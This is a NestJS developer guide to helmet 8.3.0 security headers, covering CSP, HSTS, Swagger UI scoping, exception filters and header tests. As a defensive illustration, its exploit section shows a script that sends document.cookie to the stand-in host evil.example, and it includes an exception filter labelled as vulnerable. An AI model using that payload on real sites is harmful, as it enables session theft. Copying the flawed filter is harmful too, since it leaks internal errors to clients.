---
title: Security headers
description: helmet 8.3.0 as global middleware in NestJS 12 — every default it sets, a CSP that does not break Swagger UI, headers that survive the exception filter, and curl verification.
status: current
updated: 2026-09-11
---

Response headers are instructions to the browser about what it may do with your response. They cost one line of middleware and they are the cheapest mitigation you can deploy — but only if they are actually on every response, including the 500s, the 404s, and the ones your exception filter builds. This page is helmet **8.3.0** inside Nest 12: where to register it, what it sets, which defaults fight with Swagger UI and static files, and how to prove the headers survive the error path.

What each header does, and the attacks each one blunts, is on [Security headers](../security/security-headers.md). The CSP design discussion — nonces, why `'unsafe-inline'` defeats the point, rollout with report-only — is there too and applies unchanged.

## The threat

Without them, the browser applies its most permissive defaults. `X-Content-Type-Options` absent means an uploaded file served as `application/octet-stream` can still be sniffed and executed as HTML. No CSP means an injected `<script>` runs with your origin's cookies. No HSTS means the first request of every session can be downgraded to plaintext and intercepted. No `X-Frame-Options` or `frame-ancestors` means your authenticated UI can be framed invisibly and clicked through.

None of these is a bug in your code. They are permissions you failed to withdraw.

## A concrete exploit

A Nest API with no headers, serving a user-uploaded file:

```bash
curl -i localhost:3000/files/8f1c-0000-0000-0000
```

```text
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/octet-stream
Content-Length: 68

<script>fetch('https://evil.example/x?c='+document.cookie)</script>
```

No `X-Content-Type-Options: nosniff`, so a browser that content-sniffs treats the body as HTML. No `Content-Disposition: attachment`, so it renders instead of downloading. No CSP, so the script executes. The file is served from your origin, so it runs with your origin's cookies and your origin's `fetch` credentials. Uploading a text file just became session theft.

`X-Powered-By: Express` in that response is the small half of the problem: it tells an attacker what stack to look up advisories for, at zero cost to them.

## The fix in code

```ts good title="src/main.ts"
import { NestFactory } from '@nestjs/core'
import helmet from 'helmet'
import { AppModule } from './app.module.js'

const app = await NestFactory.create(AppModule)

// FIRST. Before any route, so every response — including 404s — carries the headers.
app.use(helmet())

await app.listen(3000)
```

`helmet` **8.3.0** is plain Express middleware and Nest's `app.use()` mounts it on the underlying Express 5 instance, ahead of the router. That placement is the whole trick: middleware registered here runs before routing, so a request that matches no route still gets the headers on its way to the 404.

These are the defaults, read from helmet 8.3.0's own documentation:

| Header | Default value |
| --- | --- |
| `Content-Security-Policy` | `default-src 'self'; base-uri 'self'; font-src 'self' https: data:; form-action 'self'; frame-ancestors 'self'; img-src 'self' data:; object-src 'none'; script-src 'self'; script-src-attr 'none'; style-src 'self' https: 'unsafe-inline'; upgrade-insecure-requests` |
| `Cross-Origin-Opener-Policy` | `same-origin` |
| `Cross-Origin-Resource-Policy` | `same-origin` |
| `Origin-Agent-Cluster` | `?1` |
| `Referrer-Policy` | `no-referrer` |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` |
| `X-Content-Type-Options` | `nosniff` |
| `X-DNS-Prefetch-Control` | `off` |
| `X-Download-Options` | `noopen` |
| `X-Frame-Options` | `SAMEORIGIN` |
| `X-Permitted-Cross-Domain-Policies` | `none` |
| `X-XSS-Protection` | `0` |
| `X-Powered-By` | **removed** |

Two of those surprise people:

- **`X-XSS-Protection: 0` is correct.** The legacy browser XSS auditor it disables introduced its own vulnerabilities and has been removed from every current browser. Setting it to `0` is the modern recommendation, not an oversight.
- **`Cross-Origin-Embedder-Policy` is not set.** Helmet leaves it off because `require-corp` breaks most sites. Turn it on deliberately, when you need cross-origin isolation.

### Configuring it for a JSON API

An API that never returns HTML has a much simpler policy to write, because there is no legitimate script, style, image or frame at all:

```ts good title="src/main.ts"
app.use(
  helmet({
    contentSecurityPolicy: {
      useDefaults: false,
      directives: {
        'default-src': ["'none'"],
        'frame-ancestors': ["'none'"],
        'base-uri': ["'none'"],
        'form-action': ["'none'"],
        'upgrade-insecure-requests': [],
      },
    },
    // The API is consumed cross-origin by your SPA; CORP: same-origin would block it.
    crossOriginResourcePolicy: { policy: 'cross-origin' },
    strictTransportSecurity: { maxAge: 63072000, includeSubDomains: true },
    referrerPolicy: { policy: 'no-referrer' },
    xFrameOptions: { action: 'deny' },
  }),
)
```

`default-src 'none'` on a JSON endpoint is not theatre. It is what makes an injected-HTML response — a stack trace containing user input, a misconfigured error page — inert rather than exploitable.

:::warning `crossOriginResourcePolicy` and your front end
Helmet's default `Cross-Origin-Resource-Policy: same-origin` tells the browser to refuse the response when it is loaded from a different origin *as a subresource*. It does not affect `fetch`/XHR governed by CORS, but it does block `<img>`, `<script>` and `<link>` loads from your SPA's origin. If your API also serves images or fonts to a different origin, set `cross-origin` — and do it on that route, not globally, if you can.
:::

### Where the defaults fight with Nest features

Three collisions are worth naming, because each one produces a blank page rather than an error message.

**Swagger UI.** `@nestjs/swagger` serves an HTML page with inline scripts and styles. Helmet's default `script-src 'self'` blocks them and you get an empty document with CSP violations in the console. Scope the relaxation to the docs path rather than weakening the global policy:

```ts good title="src/main.ts"
import helmet from 'helmet'

// 1. The strict policy, for everything.
app.use(helmet(strictHelmetOptions))

// 2. Mounted at /docs and registered AFTER, so for those requests it overwrites
//    the Content-Security-Policy header the first layer set. Order is the mechanism.
app.use(
  '/docs',
  helmet({
    contentSecurityPolicy: {
      directives: {
        'script-src': ["'self'", "'unsafe-inline'"],
        'style-src': ["'self'", "'unsafe-inline'"],
        'img-src': ["'self'", 'data:'],
      },
    },
  }),
)
```

:::danger
Do not "fix" Swagger UI by adding `'unsafe-inline'` to `script-src` globally. That single change disables the most valuable directive CSP has, for every route, so that one documentation page renders. And do not expose the docs route publicly in production at all — see the rate-limiting and inventory notes below.
:::

**`ServeStaticModule`.** A Nest app serving a built SPA needs `script-src 'self'` (which the default gives you) plus whatever the bundler emits. If the build produces inline module preload scripts, use a nonce rather than `'unsafe-inline'`; the nonce pattern is worked through in [Security headers](../security/security-headers.md).

**Uploaded files.** The global CSP applies to your API's origin. It does nothing about the file you serve *from* that origin with a permissive content type. Uploads need per-response headers — `nosniff`, `Content-Disposition: attachment`, and a restrictive per-response CSP — plus, ideally, a different origin entirely. See [File upload security](file-upload-security.md).

## Registering helmet as a Nest middleware

`app.use()` in `main.ts` is simplest and is what the Nest documentation shows. The module form is worth using when the configuration needs `ConfigService`, because it goes through the DI container:

```ts good title="src/app.module.ts"
import { Module } from '@nestjs/common'
import type { MiddlewareConsumer, NestModule } from '@nestjs/common'
import { ConfigService } from '@nestjs/config'
import helmet from 'helmet'

@Module({})
export class AppModule implements NestModule {
  private readonly config: ConfigService

  constructor(config: ConfigService) {
    this.config = config
  }

  configure(consumer: MiddlewareConsumer) {
    const isProduction = this.config.get('NODE_ENV') === 'production'

    consumer
      .apply(
        helmet({
          // HSTS on localhost pins http://localhost to https in your own browser
          // for a year, which is an afternoon nobody enjoys.
          strictTransportSecurity: isProduction
            ? { maxAge: 63072000, includeSubDomains: true }
            : false,
          contentSecurityPolicy: isProduction ? undefined : false,
        }),
      )
      .forRoutes('{*splat}')
  }
}
```

Note the route pattern. Nest 12 runs on path-to-regexp 8, where the bare `'*'` form is invalid; `'{*splat}'` matches everything including the root, and `'*splat'` matches everything except it. See [Routing and path syntax](../nestjs/routing-and-path-syntax.md).

:::warning There is a real ordering difference
`app.use()` mounts on the Express instance *ahead of the Nest router*, so it runs for every request including unmatched ones. `consumer.apply().forRoutes()` binds middleware inside Nest's routing, so it runs only for requests that match the pattern. For security headers you want the former — a 404 should carry them too. Use the module form for configuration you cannot get any other way, and verify the 404 case explicitly.
:::

## Headers must survive the error path

This is the part that gets missed, and it is easy to check.

Helmet sets headers on the `response` object during the middleware phase, before your handler or any guard runs. Nest's exception filters then write a body onto that same response, so the headers are still there. Good news — the default path is correct.

Two things break it:

```ts vulnerable title="DO NOT COPY — src/common/filters/all.filter.ts"
@Catch()
export class AllExceptionsFilter implements ExceptionFilter {
  catch(exception: unknown, host: ArgumentsHost) {
    const response = host.switchToHttp().getResponse<Response>()

    // 1. Echoing the message leaks internals — a database error names your columns.
    // 2. Some hand-rolled filters replace headers wholesale instead of adding.
    response.status(500).json({ error: String(exception) })
  }
}
```

```ts good title="src/common/filters/all.filter.ts"
import { ArgumentsHost, Catch, HttpException, HttpStatus, Logger } from '@nestjs/common'
import type { ExceptionFilter } from '@nestjs/common'
import type { Response } from 'express'

@Catch()
export class AllExceptionsFilter implements ExceptionFilter {
  private readonly logger = new Logger(AllExceptionsFilter.name)

  catch(exception: unknown, host: ArgumentsHost) {
    const response = host.switchToHttp().getResponse<Response>()
    const status =
      exception instanceof HttpException ? exception.getStatus() : HttpStatus.INTERNAL_SERVER_ERROR

    // The detail goes to the log, with a correlation id. The client gets a code.
    this.logger.error('Unhandled exception', { requestId: response.getHeader('x-request-id') })

    // setHeader adds to what helmet already set; nothing is replaced.
    response.status(status).json(
      exception instanceof HttpException
        ? exception.getResponse()
        : { statusCode: status, error: 'Internal Server Error' },
    )
  }
}
```

Also relevant: middleware registered *after* something that throws synchronously never runs. Keeping `app.use(helmet())` as the very first `app.use()` call in `main.ts` means nothing can get in front of it.

## How to verify the fix

Check a normal response, a 404, and a 500. All three must carry the headers.

```bash
curl -sI localhost:3000/api/health | grep -iE 'content-security-policy|strict-transport|x-content-type|x-frame|referrer-policy|x-powered-by'
```

```text
content-security-policy: default-src 'none';frame-ancestors 'none';base-uri 'none';form-action 'none';upgrade-insecure-requests
referrer-policy: no-referrer
strict-transport-security: max-age=63072000; includeSubDomains
x-content-type-options: nosniff
x-frame-options: DENY
```

No `x-powered-by` line in that output is the pass condition for the last one.

```bash
# The 404 path — this is the one that fails when helmet is registered inside the router.
curl -sI localhost:3000/nope | grep -ic 'x-content-type-options'
```

```text
1
```

```bash
# The 500 path, against a route you can deliberately break in a test environment.
curl -sI localhost:3000/debug/boom | grep -ic 'content-security-policy'
```

```text
1
```

And in the suite, where a `main.ts`-only registration is invisible unless you say so:

```ts title="test/security-headers.e2e-spec.ts"
import { Test } from '@nestjs/testing'
import request from 'supertest'
import helmet from 'helmet'
import { AppModule } from '../src/app.module.js'
import { helmetOptions } from '../src/security-headers.options.js'

describe('security headers', () => {
  let app: import('@nestjs/common').INestApplication

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({ imports: [AppModule] }).compile()
    app = moduleRef.createNestApplication()
    // Same options object main.ts uses. Two copies drift; one does not.
    app.use(helmet(helmetOptions))
    await app.init()
  })

  afterAll(() => app.close())

  const required = [
    'content-security-policy',
    'strict-transport-security',
    'x-content-type-options',
    'x-frame-options',
    'referrer-policy',
  ]

  it.each(required)('sets %s on a normal response', async (header) => {
    const response = await request(app.getHttpServer()).get('/api/health').expect(200)
    expect(response.headers[header]).toBeDefined()
  })

  it('sets them on a 404 too', async () => {
    const response = await request(app.getHttpServer()).get('/nope').expect(404)
    for (const header of required) expect(response.headers[header]).toBeDefined()
  })

  it('does not advertise the stack', async () => {
    const response = await request(app.getHttpServer()).get('/api/health')
    expect(response.headers['x-powered-by']).toBeUndefined()
  })
})
```

The 404 assertion is the one worth having. It is the exact case that breaks when someone moves helmet from `app.use()` into `forRoutes()`, and nothing else in a normal suite notices.

## Production considerations

- **HSTS only works over HTTPS, and only matters at the edge.** If TLS terminates at a load balancer, the header must reach the browser — check it at your public hostname, not at the Node process. And `preload` is a one-way door: submitting to the preload list commits every subdomain to HTTPS, with removal taking months.
- **Set `trust proxy` correctly.** `app.getHttpAdapter().getInstance().set('trust proxy', 1)` makes `request.secure` and `request.ip` reflect the real client behind one proxy. Getting it wrong affects rate limiting far more than headers — see [Rate limiting and abuse](rate-limiting.md) — but an HSTS or redirect decision based on `request.secure` depends on it too.
- **Roll CSP out with `reportOnly: true` first.** `contentSecurityPolicy: { reportOnly: true, directives: {…} }` sends `Content-Security-Policy-Report-Only`, which reports violations without breaking anything. Watch it for a week before enforcing.
- **Do not serve Swagger UI publicly in production.** It is an inline-script page that also publishes your complete route inventory. Put it behind authentication or behind your VPN; see [OpenAPI with Swagger](../nestjs-libraries/swagger.md).
- **`Cache-Control` on authenticated responses is a security header too.** `no-store` on anything user-specific keeps it out of shared caches and out of the browser's disk cache after logout.
- **Check the headers from outside.** A CDN, a WAF or an ingress controller can add, strip or override them. The only measurement that counts is `curl -sI https://api.example.com/...` against the public hostname.

## Common mistakes

- **`app.use(helmet())` after other middleware, or inside `forRoutes()`.** Unmatched routes and anything mounted earlier miss the headers.
- **Adding `'unsafe-inline'` to `script-src` globally to make Swagger UI render.** That directive is most of CSP's value. Scope the relaxation to the docs path.
- **Leaving the default `Cross-Origin-Resource-Policy: same-origin` on an API that serves images to another origin.** The browser blocks the subresource and the error is not obvious.
- **Enabling HSTS in development.** `max-age` pins `localhost` to HTTPS in your own browser; clearing it means editing browser internals.
- **Submitting to HSTS preload before every subdomain is HTTPS-only.** Removal takes months, and an internal-only subdomain will break.
- **Relying on the global CSP to protect served uploads.** Those need per-response `nosniff` and `Content-Disposition: attachment`, and preferably a separate origin.
- **An exception filter that echoes `error.message`.** A database or validation error names your schema; that is information disclosure on your worst path.
- **Assuming `X-XSS-Protection: 0` is a mistake.** It is deliberate; the auditor it disables was itself exploitable and is gone from current browsers.
- **Measuring headers on the Node process only.** The CDN or ingress in front of it is what the browser talks to.
- **Registering helmet in `main.ts` and then writing a header test.** The test app never runs `main.ts`; apply the same options object in `beforeAll`.
- **Treating headers as a substitute for the fix.** CSP makes an XSS harder to exploit; it does not make the injection stop existing.

## Related topics

- [Security headers](../security/security-headers.md) — what each header defends against, the nonce pattern, and CSP rollout in depth.
- [Security headers with Helmet](../express-libraries/security-headers-helmet.md) — the same package outside Nest, option by option.
- [CORS](cors.md) — the other set of cross-origin headers, and why they are a different decision.
- [File upload security](file-upload-security.md) — per-response headers for bytes a user gave you.
- [Middleware](../nestjs-request-handling/middleware.md) — `app.use()` versus `consumer.apply()`, and what each one sees.
- [Exception filters](../nestjs-request-handling/exception-filters.md) — keeping the error path from leaking and from dropping headers.
- [Routing and path syntax](../nestjs/routing-and-path-syntax.md) — why the wildcard is `'*splat'` in Nest 12.
- [OpenAPI with Swagger](../nestjs-libraries/swagger.md) — the CSP collision, and why the docs route needs its own policy.
- [Rate limiting and abuse](rate-limiting.md) — the `trust proxy` setting these two pages share.
- [HTTPS and TLS](../security/https-and-tls.md) — what HSTS depends on being true.
- [OWASP API Top 10 in Nest](owasp-api-top-10.md) — headers as part of API8.
